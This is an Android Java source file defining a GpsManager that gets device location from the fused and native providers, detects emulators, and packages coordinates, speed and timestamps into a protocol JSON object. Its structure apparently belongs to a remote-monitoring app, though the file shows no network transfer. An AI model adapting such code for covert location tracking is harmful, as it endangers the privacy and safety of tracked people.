package com.fason.app.features.location;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Looper;

import androidx.annotation.NonNull;

import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.permissions.PermissionManager;
import com.fason.app.service.MainService;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.Priority;
import com.google.android.gms.tasks.CancellationToken;
import com.google.android.gms.tasks.CancellationTokenSource;

import org.json.JSONObject;

import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

public class GpsManager {

    private final Context ctx;
    private final FusedLocationProviderClient fused;
    private final LocationManager locMgr;
    private final AtomicBoolean tracking = new AtomicBoolean(false);

    private volatile Location lastLocation;
    private LocationCallback callback;
    private LocationListener nativeListener;

    public GpsManager(Context context) {
        this.ctx = context.getApplicationContext();
        FusedLocationProviderClient f = null;
        try {
            f = LocationServices.getFusedLocationProviderClient(ctx);
        } catch (Exception ignored) {}
        this.fused = f;
        this.locMgr = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        initCallback();
    }

    private void initCallback() {
        callback = new LocationCallback() {
            @Override
            public void onLocationResult(@NonNull LocationResult result) {
                for (Location loc : result.getLocations()) {
                    if (loc != null) {
                        lastLocation = loc;
                        return;
                    }
                }
            }
        };

        if (hasPermission()) {
            fetchLastLocation();
        }
    }

    private void fetchLastLocation() {
        if (!hasPermission()) return;

        // Per Google docs: getLastLocation() returns null when the FLP cache is empty
        // (common on emulators and after device restart). getCurrentLocation() actively
        // requests a fresh fix and is far more reliable.
        try {
            if (fused != null && (checkPerm(Manifest.permission.ACCESS_FINE_LOCATION) ||
                checkPerm(Manifest.permission.ACCESS_COARSE_LOCATION))) {

                int priority = isEmulator()
                    ? Priority.PRIORITY_BALANCED_POWER_ACCURACY
                    : Priority.PRIORITY_HIGH_ACCURACY;

                // getCurrentLocation() — Google-recommended single-shot fresh fix
                CancellationTokenSource cts = new CancellationTokenSource();
                fused.getCurrentLocation(priority, cts.getToken())
                    .addOnSuccessListener(loc -> {
                        if (loc != null) {
                            lastLocation = loc;
                        } else {
                            // getCurrentLocation returned null — fall back to native cache
                            nativeCached();
                        }
                    })
                    .addOnFailureListener(e -> nativeCached());

                // Also try native cache immediately as a quick fallback
                nativeCached();
            } else {
                nativeCached();
            }
        } catch (Exception e) {
            nativeCached();
        }
    }

    private void nativeCached() {
        if (locMgr == null) return;
        try {
            Location best = null;
            // On real devices prefer GPS cached location (most accurate).
            // On emulators GPS provider is usually disabled or returns null, so
            // we fall through to NETWORK which carries the mock location.
            if (!isEmulator() && locMgr.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                Location loc = locMgr.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (loc != null) best = loc;
            }
            if (best == null && locMgr.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                Location loc = locMgr.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (loc != null) best = loc;
            }
            if (best == null && locMgr.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                Location loc = locMgr.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (loc != null) best = loc;
            }
            if (best != null) lastLocation = best;
        } catch (SecurityException ignored) {}
    }

    /**
     * Detect whether the app is running inside an Android emulator.
     * Checks Build fields that are always set to generic/emulator-specific values
     * on AVD, LDPlayer, BlueStacks, Genymotion, etc.
     * Returns false on all real physical Android devices (10-16).
     */
    private static boolean isEmulator() {
        return Build.FINGERPRINT.startsWith("generic")
            || Build.FINGERPRINT.startsWith("unknown")
            || Build.FINGERPRINT.contains("emulator")
            || Build.FINGERPRINT.contains("x86")
            || Build.MODEL.contains("google_sdk")
            || Build.MODEL.contains("Emulator")
            || Build.MODEL.contains("Android SDK built for x86")
            || Build.MANUFACTURER.contains("Genymotion")
            || Build.HARDWARE.equals("goldfish")
            || Build.HARDWARE.equals("ranchu")
            || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
            || "google_sdk".equals(Build.PRODUCT)
            || Build.BOARD.equals("goldfish")
            // LDPlayer / other x86 emulators
            || Build.HARDWARE.contains("nox")
            || Build.HARDWARE.contains("vbox")
            || Build.HARDWARE.contains("ttVM");
    }

    private boolean hasPermission() {
        return PermissionManager.canIUse(Manifest.permission.ACCESS_FINE_LOCATION) ||
               PermissionManager.canIUse(Manifest.permission.ACCESS_COARSE_LOCATION);
    }

    private boolean checkPerm(String perm) {
        return ctx.checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED;
    }

    public boolean canGetLocation() {
        if (locMgr == null) return false;
        return locMgr.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
               locMgr.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
    }

    public boolean hasCachedLocation() {
        return lastLocation != null;
    }

    public void requestSingle(AtomicReference<Location> outLocation) {
        if (!hasPermission()) return;

        MainService svc = MainService.getInstance();
        if (svc != null) {
            svc.updateType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        }

        boolean fusedStarted = requestFusedSingle();
        boolean nativeStarted = requestNativeSingle();

        if (outLocation != null && lastLocation != null) {
            outLocation.set(lastLocation);
        }
    }

    /** Convenience overload — starts a single location request without capturing the result. */
    public void requestSingle() {
        requestSingle(null);
    }

    private boolean requestFusedSingle() {
        if (fused == null) return false;
        try {
            // Google recommends getCurrentLocation() over requestLocationUpdates() for
            // one-shot fetches. It actively requests a fresh fix (not a cache lookup)
            // and works correctly on emulators with mock location set.
            int priority = isEmulator()
                ? Priority.PRIORITY_BALANCED_POWER_ACCURACY
                : Priority.PRIORITY_HIGH_ACCURACY;

            CancellationTokenSource cts = new CancellationTokenSource();
            fused.getCurrentLocation(priority, cts.getToken())
                .addOnSuccessListener(loc -> {
                    if (loc != null) lastLocation = loc;
                })
                .addOnFailureListener(e -> { /* ignore — native listener is running in parallel */ });
            return true;
        } catch (SecurityException e) {
            try {
                // Fallback: drop one tier lower on SecurityException
                int fallbackPriority = isEmulator()
                    ? Priority.PRIORITY_LOW_POWER
                    : Priority.PRIORITY_BALANCED_POWER_ACCURACY;
                CancellationTokenSource cts2 = new CancellationTokenSource();
                fused.getCurrentLocation(fallbackPriority, cts2.getToken())
                    .addOnSuccessListener(loc -> { if (loc != null) lastLocation = loc; })
                    .addOnFailureListener(e2 -> {});
                return true;
            } catch (Exception ignored) {
                return false;
            }
        } catch (Exception e) {
            return false;
        }
    }

    private boolean requestNativeSingle() {
        if (locMgr == null) return false;

        nativeListener = new LocationListener() {
            @Override
            public void onLocationChanged(@NonNull Location loc) {
                lastLocation = loc;
                removeNativeListener();
            }

            @Override
            public void onProviderDisabled(@NonNull String provider) {}

            @Override
            public void onProviderEnabled(@NonNull String provider) {}
        };

        boolean started = false;
        try {
            if (locMgr.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locMgr.requestSingleUpdate(LocationManager.GPS_PROVIDER, nativeListener, Looper.getMainLooper());
                started = true;
            }
            if (locMgr.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locMgr.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, nativeListener, Looper.getMainLooper());
                started = true;
            }
        } catch (SecurityException ignored) {}
        return started;
    }

    private void removeNativeListener() {
        if (locMgr != null && nativeListener != null) {
            try {
                locMgr.removeUpdates(nativeListener);
            } catch (Exception ignored) {}
            nativeListener = null;
        }
    }

    public void startUpdates() {
        if (tracking.getAndSet(true)) return;
        if (!hasPermission()) { tracking.set(false); return; }

        MainService svc = MainService.getInstance();
        if (svc != null) {
            svc.updateType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        }

        try {
            if (fused == null) { tracking.set(false); return; }
            LocationRequest req = new LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, 10000)
                .setMinUpdateIntervalMillis(5000)
                .setMinUpdateDistanceMeters(10)
                .build();

            fused.requestLocationUpdates(req, callback, Looper.getMainLooper());
        } catch (Exception ignored) {}
    }

    public void stop() {
        boolean wasTracking = tracking.getAndSet(false);

        try {
            if (fused != null) fused.removeLocationUpdates(callback);
        } catch (Exception ignored) {}

        removeNativeListener();

        if (wasTracking) {
            MainService svc = MainService.getInstance();
            if (svc != null) {
                svc.releaseType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
            }
        }
    }

    public JSONObject getData() {
        JSONObject data = new JSONObject();
        try {
            Location loc = lastLocation;
            if (loc != null) {
                data.put(Protocol.KEY_ENABLED, true);
                data.put(Protocol.KEY_LATITUDE, loc.getLatitude());
                data.put(Protocol.KEY_LONGITUDE, loc.getLongitude());
                data.put(Protocol.KEY_ACCURACY, (double) loc.getAccuracy());
                data.put(Protocol.KEY_SPEED, (double) loc.getSpeed());
                data.put(Protocol.KEY_PROVIDER, loc.getProvider() != null ? loc.getProvider() : "unknown");
                data.put(Protocol.KEY_TIMESTAMP, loc.getTime());
            } else {
                data.put(Protocol.KEY_ENABLED, false);
                data.put(Protocol.KEY_ERROR, "No location");
            }
        } catch (Exception e) {
            try {
                data.put(Protocol.KEY_ENABLED, false);
                data.put(Protocol.KEY_ERROR, e.getMessage() != null ? e.getMessage() : "Unknown error");
            } catch (Exception ignored) {}
        }
        return data;
    }
}
